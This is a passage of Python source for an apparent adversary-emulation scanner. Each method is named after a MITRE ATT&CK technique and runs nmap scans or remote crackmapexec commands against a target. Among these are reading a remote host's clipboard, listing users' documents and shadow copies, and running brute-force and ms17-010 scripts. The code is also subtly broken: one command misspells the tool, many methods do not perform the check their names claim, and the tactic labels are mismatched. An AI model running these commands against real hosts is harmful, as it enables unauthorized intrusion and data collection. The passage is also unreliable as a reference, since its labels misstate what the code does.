        self.log(f"[*] T1119: Automatic collection check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'dir /s /b C:\\\\Users\\\\*\\\\Documents\\\\* 2>nul | head -20' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1119"] = output
        return output

    def T1113_screen_capture(self, target):
        self.log(f"[*] T1113: Screen capture capability check on {target}")
        output = self.run_command(
            f"crackapexec smb {target} -x 'where snippingtool 2>nul' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1113"] = output
        return output

    def T1114_email_collection(self, target):
        self.log(f"[*] T1114: Email collection check on {target}")
        output = self.run_command(
            f"nmap -p 25,110,143,993,995,587 --script=smtp-enum-users,imap-capabilities {target}", timeout=30
        )
        self.results["T1114"] = output
        return output

    def T1056_002_input_capture(self, target):
        self.log(f"[*] T1056.002: Input capture (GUI input) check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'tasklist /m 2>nul | findstr /i mouse' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1056_002"] = output
        return output

    def T1125_video_capture(self, target):
        self.log(f"[*] T1125: Video capture capability check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'where ffmpeg 2>nul || where powershell 2>nul' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1125"] = output
        return output

    def T1115_clipboard_data(self, target):
        self.log(f"[*] T1115: Clipboard data collection on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'powershell Get-Clipboard 2>nul' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1115"] = output
        return output

    def T1560_001_archive_collected_data(self, target):
        self.log(f"[*] T1560.001: Archive collected data check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'where rar 2>nul || where 7z 2>nul || where zip 2>nul' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1560_001"] = output
        return output

    # =========================================================================
    # TA0008 - Lateral Movement (continued from TA0006)
    # =========================================================================

    def T1534_internal_spearphishing(self, target):
        self.log(f"[*] T1534: Internal spearphishing capability on {target}")
        output = self.run_command(f"nmap -p 25,587,465 --script=smtp-enum-users,smtp-open-relay {target}", timeout=30)
        self.results["T1534"] = output
        return output

    def T1572_protocol_tunneling(self, target):
        self.log(f"[*] T1572: Protocol tunneling check on {target}")
        output = self.run_command(f"nmap -p 443,8443 --script=ssl-cert,ssl-enum-ciphers {target}", timeout=30)
        self.results["T1572"] = output
        return output

    def T1090_001_proxy_internal(self, target):
        self.log(f"[*] T1090.001: Internal proxy detection on {target}")
        output = self.run_command(f"nmap -p 3128,8080,8888,1080 --script=http-proxy-info {target}", timeout=30)
        self.results["T1090_001"] = output
        return output

    def T1090_002_proxy_external(self, target):
        self.log(f"[*] T1090.002: External proxy detection on {target}")
        output = self.run_command(f"nmap -p 80,443 --script=http-title,http-methods {target}", timeout=30)
        self.results["T1090_002"] = output
        return output

    def T1105_ingress_tool_transfer(self, target):
        self.log(f"[*] T1105: Ingress tool transfer on {target}")
        output = self.run_command(f"nmap -p 80,443,8080 --script=http-title,http-enum {target}", timeout=30)
        self.results["T1105"] = output
        return output

    # =========================================================================
    # TA0011 - Command and Control
    # =========================================================================

    def T1071_001_web_protocols(self, target):
        self.log(f"[*] T1071.001: Web protocol C2 detection on {target}")
        output = self.run_command(
            f"nmap -p 80,443,8080,8443 --script=http-title,http-headers,ssl-cert {target}", timeout=30
        )
        self.results["T1071_001"] = output
        return output

    def T1071_002_file_transfer_protocols(self, target):
        self.log(f"[*] T1071.002: File transfer protocol C2 on {target}")
        output = self.run_command(f"nmap -p 20,21,69,445,139 --script=ftp-anon,ftp-syst {target}", timeout=30)
        self.results["T1071_002"] = output
        return output

    def T1071_003_mail_protocols(self, target):
        self.log(f"[*] T1071.003: Mail protocol C2 on {target}")
        output = self.run_command(
            f"nmap -p 25,110,143,465,587,993,995 --script=smtp-enum-users,imap-capabilities {target}", timeout=30
        )
        self.results["T1071_003"] = output
        return output

    def T1090_003_multi_hop_proxy(self, target):
        self.log(f"[*] T1090.003: Multi-hop proxy check on {target}")
        output = self.run_command(f"nmap -p 80,443,8080,1080,3128 --script=http-title {target}", timeout=30)
        self.results["T1090_003"] = output
        return output

    def T1102_002_bidirectional_communication(self, target):
        self.log(f"[*] T1102.002: Web service C2 check on {target}")
        output = self.run_command(f"nmap -p 80,443 --script=http-title,http-headers,ssl-cert {target}", timeout=30)
        self.results["T1102_002"] = output
        return output

    def T1568_002_domain_generation(self, target):
        self.log(f"[*] T1568.002: Domain generation algorithm check on {target}")
        output = self.run_command(f"nmap -p 53 --script=dns-brute {target}", timeout=60)
        self.results["T1568_002"] = output
        return output

    def T1573_001_symmetric_cryptography(self, target):
        self.log(f"[*] T1573.001: Encrypted C2 channel check on {target}")
        output = self.run_command(f"nmap -p 443 --script=ssl-enum-ciphers,ssl-cert {target}", timeout=30)
        self.results["T1573_001"] = output
        return output

    def T1573_002_asymmetric_cryptography(self, target):
        self.log(f"[*] T1573.002: Asymmetric encrypted C2 on {target}")
        output = self.run_command(f"nmap -p 443,8443 --script=ssl-cert,ssl-enum-ciphers {target}", timeout=30)
        self.results["T1573_002"] = output
        return output

    def T1104_multi_stage_channels(self, target):
        self.log(f"[*] T1104: Multi-stage C2 channel check on {target}")
        output = self.run_command(f"nmap -p 80,443,53,8080 --script=http-title,ssl-cert {target}", timeout=30)
        self.results["T1104"] = output
        return output

    def T1132_001_standard_encoding(self, target):
        self.log(f"[*] T1132.001: Standard encoding C2 check on {target}")
        output = self.run_command(f"nmap -p 80,443 --script=http-headers,http-title {target}", timeout=30)
        self.results["T1132_001"] = output
        return output

    def T1571_non_standard_port(self, target):
        self.log(f"[*] T1571: Non-standard port C2 detection on {target}")
        output = self.run_command(f"nmap -p 8000,8888,9090,4444,1234,6666 --script=http-title {target}", timeout=30)
        self.results["T1571"] = output
        return output

    def T1095_non_application_layer_protocol(self, target):
        self.log(f"[*] T1095: Non-application layer protocol C2 on {target}")
        output = self.run_command(f"nmap -sY -sU -p 22,53,123,161,500 --script=snmp-info {target}", timeout=60)
        self.results["T1095"] = output
        return output

    def T1568_dynamic_resolution(self, target):
        self.log(f"[*] T1568: Dynamic DNS resolution C2 on {target}")
        output = self.run_command(
            f"dig {target} A +short; dig {target} AAAA +short; dig {target} CNAME +short", timeout=15
        )
        self.results["T1568"] = output
        return output

    # =========================================================================
    # TA0010 - Exfiltration
    # =========================================================================

    def T1048_001_exfil_over_alternative_protocol(self, target):
        self.log(f"[*] T1048.001: Exfil over alternative protocol on {target}")
        output = self.run_command(f"nmap -p 20,21,69,445,139 --script=ftp-anon {target}", timeout=30)
        self.results["T1048_001"] = output
        return output

    def T1048_002_exfil_over_symmetric_encrypted(self, target):
        self.log(f"[*] T1048.002: Exfil over encrypted non-C2 on {target}")
        output = self.run_command(f"nmap -p 443,8443,993,995 --script=ssl-enum-ciphers {target}", timeout=30)
        self.results["T1048_002"] = output
        return output

    def T1048_003_exfil_over_asymmetric_encrypted(self, target):
        self.log(f"[*] T1048.003: Exfil over asymmetric encryption on {target}")
        output = self.run_command(f"nmap -p 443,8443 --script=ssl-cert {target}", timeout=30)
        self.results["T1048_003"] = output
        return output

    def T1041_exfiltration_over_c2(self, target):
        self.log(f"[*] T1041: Exfiltration over C2 channel on {target}")
        output = self.run_command(f"nmap -p 80,443,8080,8443 --script=http-title,ssl-cert {target}", timeout=30)
        self.results["T1041"] = output
        return output

    def T1567_002_exfil_to_cloud_storage(self, target):
        self.log(f"[*] T1567.002: Exfil to cloud storage check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'powershell (Get-NetTCPConnection -State Established).RemoteAddress 2>nul | findstr google amazon dropbox' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1567_002"] = output
        return output

    def T1029_scheduled_transfer(self, target):
        self.log(f"[*] T1029: Scheduled data transfer check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'schtasks /query /fo LIST 2>nul | findstr /i transfer' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1029"] = output
        return output

    def T1030_data_transfer_size_limits(self, target):
        self.log(f"[*] T1030: Data transfer size limits check on {target}")
        output = self.run_command(f"nmap -p 80,443 --script=http-title,http-methods {target}", timeout=30)
        self.results["T1030"] = output
        return output

    # =========================================================================
    # TA0040 - Impact
    # =========================================================================

    def T1486_data_encrypted_for_impact(self, target):
        self.log(f"[*] T1486: Ransomware/encryption impact check on {target}")
        output = self.run_command(f"nmap -p 445,139 --script=smb-vuln-ms17-010 {target}", timeout=60)
        self.results["T1486"] = output
        return output

    def T1485_data_destruction(self, target):
        self.log(f"[*] T1485: Data destruction capability check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} --shares 2>/dev/null | grep -i 'READ\\|WRITE' || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1485"] = output
        return output

    def T1490_inhibit_system_recovery(self, target):
        self.log(f"[*] T1490: System recovery inhibition check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'vssadmin list shadows 2>nul' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1490"] = output
        return output

    def T1491_001_internal_defacement(self, target):
        self.log(f"[*] T1491.001: Internal defacement check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'dir C:\\\\inetpub\\\\wwwroot 2>nul' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1491_001"] = output
        return output

    def T1491_002_external_defacement(self, target):
        self.log(f"[*] T1491.002: External defacement check on {target}")
        output = self.run_command(f"curl -s -I http://{target}/ 2>/dev/null | head -10", timeout=15)
        self.results["T1491_002"] = output
        return output

    def T1499_001_os_defacement(self, target):
        self.log(f"[*] T1499.001: OS defacement resource check on {target}")
        output = self.run_command(f"nmap -p 80,443,8080 --script=http-title {target}", timeout=30)
        self.results["T1499_001"] = output
        return output

    def T1498_network_denial_of_service(self, target):
        self.log(f"[*] T1498: Network DoS capability check on {target}")
        output = self.run_command(f"nmap -p 80,443,8080 --script=http-title,http-methods {target}", timeout=30)
        self.results["T1498"] = output
        return output

    def T1499_002_service_exhaustion_flood(self, target):
        self.log(f"[*] T1499.002: Service exhaustion flood check on {target}")
        output = self.run_command(f"nmap -p 80,443,8080,3389 --script=http-title {target}", timeout=30)
        self.results["T1499_002"] = output
        return output

    def T1561_disk_wipe(self, target):
        self.log(f"[*] T1561: Disk wipe capability check on {target}")
        output = self.run_command(
            f"crackmapexec smb {target} -x 'wmic diskdrive get model,size 2>nul' 2>/dev/null || echo 'SMB not accessible'",
            timeout=30,
        )
        self.results["T1561"] = output
        return output

    def T1495_firmware_corruption(self, target):
        self.log(f"[*] T1495: Firmware corruption check on {target}")
        output = self.run_command(f"nmap -p 443 --script=ssl-cert {target}", timeout=30)
        self.results["T1495"] = output
        return output

    def T1496_resource_hijacking(self, target):
        self.log(f"[*] T1496: Resource hijacking (cryptomining) check on {target}")
        output = self.run_command(
            f"nmap -p 3333,4444,5555,7777,8888,9999,14433,14444 --script=http-title {target}", timeout=30
        )
        self.results["T1496"] = output
        return output

    def T1565_001_data_manipulation_stored(self, target):
        self.log(f"[*] T1565.001: Stored data manipulation check on {target}")
        output = self.run_command(
            f"nmap -p 3306,5432,1433,27017 --script=mysql-info,pgsql-brute,mongodb-info {target}", timeout=30
        )
        self.results["T1565_001"] = output
        return output

    def T1565_002_data_manipulation_transit(self, target):
        self.log(f"[*] T1565.002: Transit data manipulation check on {target}")
        output = self.run_command(f"nmap -p 443 --script=ssl-poodle,ssl-ccs-injection {target}", timeout=30)
        self.results["T1565_002"] = output
        return output

    # =========================================================================
    # Utility Methods
    # =========================================================================

    def get_all_techniques(self):
        """Return list of all available technique IDs"""
        techniques = []
        for attr in dir(self):
            if attr.startswith("T") and "_" in attr and not attr.startswith("T_"):
                if callable(getattr(self, attr)):
                    techniques.append(attr)
        return sorted(techniques)

    def get_techniques_by_tactic(self, tactic_id):
        """Return techniques belonging to a specific tactic"""
        tactic_map = {
            "TA0043": ["T1595", "T1592", "T1589", "T1591", "T1598"],
            "TA0042": ["T1583", "T1584", "T1585", "T1586", "T1588", "T1608"],
            "TA0001": ["T1189", "T1190", "T1133", "T1200", "T1566", "T1078", "T1195"],
            "TA0002": ["T1059", "T1053", "T1047", "T1203"],
            "TA0003": ["T1098", "T1136", "T1543", "T1546", "T1547", "T1574", "T1505"],
            "TA0004": ["T1068", "T1055", "T1134", "T1548", "T1484"],
            "TA0005": ["T1027", "T1036", "T1070", "T1112", "T1140", "T1202", "T1218", "T1221", "T1497", "T1056"],
            "TA0112": ["T1003", "T1110", "T1558", "T1557", "T1555", "T1552"],
            "TA0007": [
                "T1046",
                "T1018",
                "T1082",
                "T1083",
                "T1016",
                "T1049",
                "T1033",
                "T1069",
                "T1057",
                "T1087",
                "T1482",
                "T1614",
                "T1010",
            ],
            "TA0006": ["T1021", "T1570", "T1550", "T1563"],
            "TA0008": ["T1534", "T1572", "T1090", "T1105"],
            "TA0009": ["T1005", "T1039", "T1074", "T1119", "T1113", "T1114", "T1056", "T1125", "T1115", "T1560"],
            "TA0011": ["T1071", "T1568", "T1573", "T1104", "T1132", "T1571", "T1095", "T1568"],
            "TA0010": ["T1048", "T1041", "T1567", "T1029", "T1030"],
            "TA0040": ["T1486", "T1485", "T1490", "T1491", "T1499", "T1498", "T1561", "T1495", "T1496", "T1565"],
        }
        prefixes = tactic_map.get(tactic_id, [])
        techniques = []
        for attr in dir(self):
            if attr.startswith("T") and "_" in attr and callable(getattr(self, attr)):
                for prefix in prefixes:
                    if attr.startswith(prefix):
                        techniques.append(attr)
                        break
        return sorted(techniques)

    def execute_technique(self, technique_id, target):
        """Execute a technique by ID"""
        method_name = None
        for attr in dir(self):
            if attr.startswith(technique_id) and callable(getattr(self, attr)):
                method_name = attr
                break
        if method_name:
            method = getattr(self, method_name)
            return method(target)
        return f"[!] Technique {technique_id} not found"

    def run_full_scan(self, target):
        """Execute all techniques against a target"""
        self.log(f"[*] Starting full MITRE ATT&CK scan against {target}")
        all_techniques = self.get_all_techniques()
        results = {}
        for tech in all_techniques:
            try:
                method = getattr(self, tech)
                results[tech] = method(target)
            except Exception as e:
                results[tech] = f"[!] Error executing {tech}: {str(e)}"
        self.log(f"[*] Full scan complete. {len(results)} techniques executed.")
        return results
